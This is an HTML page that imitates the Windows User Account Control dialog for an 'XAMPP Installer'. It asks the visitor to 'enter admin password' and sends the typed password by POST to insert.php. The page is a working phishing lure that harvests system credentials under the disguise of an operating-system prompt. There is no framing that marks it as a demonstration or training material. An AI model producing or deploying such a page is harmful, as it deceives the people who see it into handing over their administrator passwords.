<!DOCTYPE html>
<html lang="en">
<head>
    <style>
        body{
            background: url("bg.jpg");
            font-family: Segoe UI;

background-repeat: no-repeat;
background-size: cover;
        }
        .prompt{
            position: absolute;
    top: 50%;
    left: 50%;
    -moz-transform: translateX(-50%) translateY(-50%);
    -webkit-transform: translateX(-50%) translateY(-50%);
    transform: translateX(-50%) translateY(-50%);
        }


.top{
    background-color: rgb(118,185,237);
    padding: 10px;
    font-size: 15px;
}
        .bottom{
            background-color: rgb(230,230,230);
            padding: 10px;
            font-size: 10px;
        }

        .bottom img{
            height: 30px;
        }
.des{
    width: 200px;
    display: flex;
    align-items: center;
}

.avatar{
    display: flex;
    align-items: center;
}
input{
    width: 95%;
}

    </style>
    <link rel="stylesheet" href="https://nikas.com.n">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
</head>
<body>
    <div class="prompt">
        <div class="top">User Account Control</div>
        <div class="bottom">
            Do you want to allow this app to make changes to your device?<br><br>
            <div class="des"><img src="xampp.png" alt="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b> XAMPP Installer</b> </div><br>
            <div class="insert">
            <div class="avatar"><object data="avatar.svg" width="30" height="30"> </object>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;To continue, enter admin password</div> <br>
                <form action="insert.php" method="post">
                    <input type="password" name="pass" id="" style="border: 1px solid black; height: 20px;">
                </form>
            </div>
        </div>
    </div>
</body>
</html>